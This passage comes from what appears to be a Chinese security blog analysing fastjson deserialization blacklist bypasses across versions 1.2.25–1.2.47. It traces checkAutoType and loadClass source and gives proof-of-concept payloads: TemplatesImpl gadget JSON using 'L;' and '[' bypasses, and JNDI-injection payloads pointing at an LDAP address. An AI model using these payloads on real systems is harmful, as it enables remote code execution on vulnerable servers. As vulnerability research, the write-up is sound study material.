class=\"comment\">//获取黑名单，匹配到直接退出</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (className.startsWith(deny)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*依旧是从map中寻找常见类，不影响*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">       </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (autoTypeSupport || expectClass != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//重点，由于autoTypeSupport为开启，对于上面不匹配白、黑名单的，这里直接进行loadClass</span></span><br><span class=\"line\">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (clazz != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">////对于加载的类进行危险性判断，判断加载的clazz是否继承自Classloader与DataSource</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class=\"comment\">// classloader is danger</span></span><br><span class=\"line\">                    || DataSource.class.isAssignableFrom(clazz) <span class=\"comment\">// dataSource can load jdbc driver</span></span><br><span class=\"line\">                    ) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (expectClass != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;type not match. &quot;</span> + typeName + <span class=\"string\">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">//返回load之后的class</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n</li>\n</ul>\n<p>这里就能感觉到存在一些问题了，最后对于不满足黑白名单判断的要进行loadClass，绕过的方式也就存在于loadClass</p>\n<h2 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h2><p>利用条件：开启AutoTypeSupport，跟一下 TypeUtils.loadClass</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (className == <span class=\"keyword\">null</span> || className.length() == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (clazz != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//className 以&#x27;[&#x27;开头</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (className.charAt(<span class=\"number\">0</span>) == <span class=\"string\">&#x27;[&#x27;</span>) &#123;</span><br><span class=\"line\">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class=\"number\">1</span>), classLoader);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Array.newInstance(componentType, <span class=\"number\">0</span>).getClass();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//className 以&#x27;L&#x27;开头 以&#x27;;&#x27;结尾，去掉开头结尾，完成bypass</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (className.startsWith(<span class=\"string\">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class=\"string\">&quot;;&quot;</span>)) &#123;</span><br><span class=\"line\">            String newClassName = className.substring(<span class=\"number\">1</span>, className.length() - <span class=\"number\">1</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> loadClass(newClassName, classLoader);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ...</span><br></pre></td></tr></table></figure>\n\n<p>呼之欲出, 只需要 <strong>开头加上 L , 结尾加上 ;</strong> ，但是其实 [ 是可以绕过的</p>\n<p>所以poc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">fastjsonDemo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        String payload = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;yv66vgAAADQAJgo...\\&quot;],&#x27;_name&#x27;:&#x27;c.c&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\\&quot;_outputProperties\\&quot;:&#123;&#125;,\\&quot;_name\\&quot;:\\&quot;a\\&quot;,\\&quot;_version\\&quot;:\\&quot;1.0\\&quot;,\\&quot;allowedProtocols\\&quot;:\\&quot;all\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //关闭白名单机制,基于内置黑名单实现安全</span></span><br><span class=\"line\">        JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>JNDI注入poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,</span><br><span class=\"line\">    &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:23457&#x2F;Command8&quot;,</span><br><span class=\"line\">    &quot;autoCommit&quot;:true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/3d17d2a14f34ccbf600db7ef5239255a.png\" alt=\"image-20220401164056672\"></p>\n<h1 id=\"1-2-42\"><a href=\"#1-2-42\" class=\"headerlink\" title=\"1.2.42\"></a>1.2.42</h1><h2 id=\"修复-1\"><a href=\"#修复-1\" class=\"headerlink\" title=\"修复\"></a>修复</h2><p>两点</p>\n<ol>\n<li>修改明文黑名单为黑名单的hash</li>\n<li>对于传入的类名，删除开头<code>L</code>和结尾的<code>;</code></li>\n</ol>\n<p>用的hash确实能混淆我这种小白</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/3030d2d3000cc135c29a2f3a8c6f5126.png\" alt=\"image-20220401165726738\"></p>\n<p>跟进 checkAutoType 去看看，对第一个字符和最后一个字符计算hash，然后判断是L; 删掉</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/9869bfac6cd3796df2d2a86020fa6f95.png\" alt=\"image-20220401170140890\"></p>\n<h2 id=\"绕过-1\"><a href=\"#绕过-1\" class=\"headerlink\" title=\"绕过\"></a>绕过</h2><p>利用条件：开启AutoTypeSupport</p>\n<p><strong>双写L;</strong> 就行了</p>\n<h1 id=\"1-2-43\"><a href=\"#1-2-43\" class=\"headerlink\" title=\"1.2.43\"></a>1.2.43</h1><h2 id=\"修复-2\"><a href=\"#修复-2\" class=\"headerlink\" title=\"修复\"></a>修复</h2><p>两层判断，如果双写了L; 直接抛错退出</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/6a72ad2198e1a12d4c7af73ec24178a5.png\" alt=\"image-20220401171703156\"></p>\n<h2 id=\"绕过-2\"><a href=\"#绕过-2\" class=\"headerlink\" title=\"绕过\"></a>绕过</h2><p>然后目光就转向了之前的 ‘[‘  目前我只找到了利用方式，至于细节代码部分，能力有限，挖个坑</p>\n<p>利用条件: 需要开启autotype</p>\n<p>poc利用了 <strong>[ 和 [{</strong>  ，同样的<strong>可以绕过以上版本</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">fastjsonDemo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        String payload = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\\&quot;[&#123;,\\&quot;_bytecodes\\&quot;:[\\&quot;yv66vgAAADQAJgo...\\&quot;],&#x27;_name&#x27;:&#x27;c.c&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\\&quot;_outputProperties\\&quot;:&#123;&#125;,\\&quot;_name\\&quot;:\\&quot;a\\&quot;,\\&quot;_version\\&quot;:\\&quot;1.0\\&quot;,\\&quot;allowedProtocols\\&quot;:\\&quot;all\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //关闭白名单机制,基于内置黑名单实现安全</span></span><br><span class=\"line\">        JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>在1.2.44版本修复了[ 绕过黑名单的问题，做法是，以 [ 开头直接抛出异常</strong></p>\n<h1 id=\"1-2-45\"><a href=\"#1-2-45\" class=\"headerlink\" title=\"1.2.45\"></a>1.2.45</h1><p>这个版本爆了一个绕过黑名单，利用条件: mybatis的3.x版本且&lt;3.5.0、需要开启autotype</p>\n<p>poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,</span><br><span class=\"line\">    &quot;properties&quot;:&#123;</span><br><span class=\"line\">        &quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:23457&#x2F;Command8&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"1-2-47-通杀\"><a href=\"#1-2-47-通杀\" class=\"headerlink\" title=\"1.2.47 - 通杀\"></a>1.2.47 - 通杀</h1><p>利用条件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.32 未开启 AutoTypeSupport</span><br><span class=\"line\">1.2.33 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47</span><br></pre></td></tr></table></figure>\n\n<p>回到 checkAutoType 这里</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class=\"keyword\">int</span> features) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//1.typeName为空情况</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//2.长度判断</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//3.替换 $ 为 .</span></span><br><span class=\"line\">    </span><br><span class=\"line\">        Class&lt;?&gt; clazz = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//4.hash方式对L|;|[ 进行判断</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">    \t<span class=\"comment\">//5.autoTypeSupport为true(白名单关闭情况下)，对比 acceptHashCodes 加载白名单，匹配到直接return</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (autoTypeSupport || expectClass != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">long</span> hash = h3;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class=\"line\">                hash ^= className.charAt(i);</span><br><span class=\"line\">                hash *= PRIME;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (clazz != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"comment\">//对比denyHashCodes匹配到黑名单 </span></span><br><span class=\"line\">                <span class=\"comment\">//且 从TypeUtils.mappings中找不到这个类，抛出错误</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class=\"number\">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">    \t<span class=\"comment\">//6.尝试从TypeUtils.mappings中获取这个类名的类</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (clazz == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">//7.尝试在 deserializers 中获取这个类</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (clazz == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            clazz = deserializers.findClass(typeName);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">//8.如果通过上面两步，获取到了clazz，直接走到return clazz;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (clazz != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (expectClass != <span class=\"keyword\">null</span></span><br><span class=\"line\">                    &amp;&amp; clazz != java.util.HashMap.class</span><br><span class=\"line\">                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;type not match. &quot;</span> + typeName + <span class=\"string\">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">//9.autoTypeSupport为false(默认白名单开启的情况)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!autoTypeSupport) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">long</span> hash = h3;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">char</span> c = className.charAt(i);</span><br><span class=\"line\">                hash ^= c;</span><br><span class=\"line\">                hash *= PRIME;</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">//匹配黑名单直接退出</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">//白名单默认为空，走不到loadClass</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (clazz == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\">//走不到这里</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (expectClass != <span class=\"keyword\">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;type not match. &quot;</span> + typeName + <span class=\"string\">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">//10.通过上面不匹配黑名单，白名单为空后，进行loadClass</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (clazz == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*其他一些代码*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>白名单关闭时，匹配白名单后直接加载，抛出异常时需要满足两个条件1.黑名单 2.TypeUtils.getClassFromMapping找不到该类</li>\n<li>白名单开启时，首先检查黑名单，我们这里直接被退出，无法利用</li>\n<li>看了上面两种情况后，把目光转向第6 .7 .8步，如果从6.7步直接找到了我们需要的类，直接就return，不就可以绕过下面的黑名单，所以现在需要跟进 <strong>TypeUtils.getClassFromMapping</strong> 中和 <strong>deserializers.loadClass</strong> 看看到底进行了什么操作</li>\n</ul>\n<h2 id=\"deserializers-findClass\"><a href=\"#deserializers-findClass\" class=\"headerlink\" title=\"deserializers.findClass\"></a>deserializers.findClass</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">com.alibaba.fastjson.parser.ParserConfig private final IdentityHashMap&lt;Type, ObjectDeserializer&gt; deserializers &#x3D; new IdentityHashMap&lt;Type, ObjectDeserializer&gt;()</span><br></pre></td></tr></table></figure>\n\n<p>可以看到deserializers为一个hashmap，因为当前操作为findClass，取数据操作，搜索一下哪些函数进行了赋值，发现有三个</p>\n<ul>\n<li>initDeserializers()</li>\n<li>getDeserializer()</li>\n<li>putDeserializer()</li>\n</ul>\n<p>initDeserializers():在构造函数中调用，传入一些没有危害的类</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/58e52984c69e9e60dd84c6de24edb590.png\" alt=\"image-20220402105113402\"></p>\n<p>getDeserializer()：这个类用来加载一些特定类，以及有 JSONType 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/f7b8a9d0e5a26a31deb2fd7c9f2e5ed6.png\" alt=\"image-20220402105907847\"></p>\n<p>putDeserializer()：被前两个函数调用，我们无法控制入参</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/34974064a06c84196e84e32b806ceaa0.png\" alt=\"image-20220402110022755\"></p>\n<p>所以deserializers 的值不可控，都是写死的，没有利用可能</p>\n<blockquote>\n<p>这个<strong>deserializers在checkAutoType方法中存在的意义</strong>应该是直接放行一些常用的类，来提升解析速度</p>\n</blockquote>\n<h2 id=\"TypeUtils-mappings\"><a href=\"#TypeUtils-mappings\" class=\"headerlink\" title=\"TypeUtils.mappings\"></a>TypeUtils.mappings</h2><p>跟进是一个从mappings的get操作，mappings为 ConcurrentMap 对象</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">com.alibaba.fastjson.util.TypeUtils private static ConcurrentMap&lt;String, Class&lt;?&gt;&gt; mappings &#x3D; new ConcurrentHashMap&lt;String, Class&lt;?&gt;&gt;(16, 0.75f, 1)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/32a97b376bb6836732914cc6d85c20fb.png\" alt=\"image-20220402110629230\"></p>\n<p>老样子看看赋值的函数，搜索mappings.put，发现存在两个函数</p>\n<ul>\n<li>addBaseClassMappings()</li>\n<li>loadClass()</li>\n</ul>\n<p>addBaseClassMappings，写死</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/ba500166acf9b3464c2151bb2330fa14.png\" alt=\"image-20220402110852381\"></p>\n<p>而且调用处，一处在static静态代码块</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/09ea9d0b23303894e88b656ca7ce2415.png\" alt=\"image-20220402111356679\"></p>\n<p>一处 clearClassMapping() </p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/ea5d72a64452b538a926a59f4b0ab7a6.png\" alt=\"image-20220402111428903\"></p>\n<p>完全不可控，转向 loadClass()，这个函数文章一开始跟过，就是利用L;绕过，这次完整分析一下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class=\"keyword\">boolean</span> cache) &#123;</span><br><span class=\"line\">    <span class=\"comment\">//判断是否为空</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(className == <span class=\"keyword\">null</span> || className.length() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//尝试从mappings中获取</span></span><br><span class=\"line\">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class=\"line\">    <span class=\"comment\">//不为空直接返回</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(clazz != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//判断是否以[开头</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(className.charAt(<span class=\"number\">0</span>) == <span class=\"string\">&#x27;[&#x27;</span>)&#123;</span><br><span class=\"line\">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class=\"number\">1</span>), classLoader);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Array.newInstance(componentType, <span class=\"number\">0</span>).getClass();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//判断是否以L开头、;结尾</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(className.startsWith(<span class=\"string\">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class=\"string\">&quot;;&quot;</span>))&#123;</span><br><span class=\"line\">        String newClassName = className.substring(<span class=\"number\">1</span>, className.length() - <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> loadClass(newClassName, classLoader);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//如果传入的classLoader不为空</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(classLoader != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"comment\">//调用传入的类加载器进行加载</span></span><br><span class=\"line\">            clazz = classLoader.loadClass(className);</span><br><span class=\"line\">            <span class=\"comment\">//判断传入的cache</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (cache) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//为True时，将className传入mappings(这里就存在利用点了)</span></span><br><span class=\"line\">                mappings.put(className, clazz);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span>(Throwable e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        <span class=\"comment\">// skip</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//这里就比较相似了</span></span><br><span class=\"line\">        <span class=\"comment\">//如果上面失败，或没有指定 ClassLoader ，则使用当前线程的 contextClassLoader 来加载类</span></span><br><span class=\"line\">        <span class=\"comment\">//也需要 cache 为 true 才能写入 mappings 中</span></span><br><span class=\"line\">        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(contextClassLoader != <span class=\"keyword\">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class=\"line\">            clazz = contextClassLoader.loadClass(className);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (cache) &#123;</span><br><span class=\"line\">                mappings.put(className, clazz);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span>(Throwable e)&#123;</span><br><span class=\"line\">        <span class=\"comment\">// skip</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//依旧失败利用Class.forName，加载类，放入到mappings</span></span><br><span class=\"line\">        clazz = Class.forName(className);</span><br><span class=\"line\">        mappings.put(className, clazz);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span>(Throwable e)&#123;</span><br><span class=\"line\">        <span class=\"comment\">// skip</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>也就是说如果可控loadClass()的参数，就很有可能将类名传入到mappings，就可以在黑名单之前return</p>\n<p>搜一下<code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) </code> 用法</p>\n<p>跟一下TypeUtils 的 loadClass</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/baa897f3068206603dc5ad8258f1ddcd.png\" alt=\"image-20220402141616195\"></p>\n<p>就在上方<code>Class&lt;?&gt; 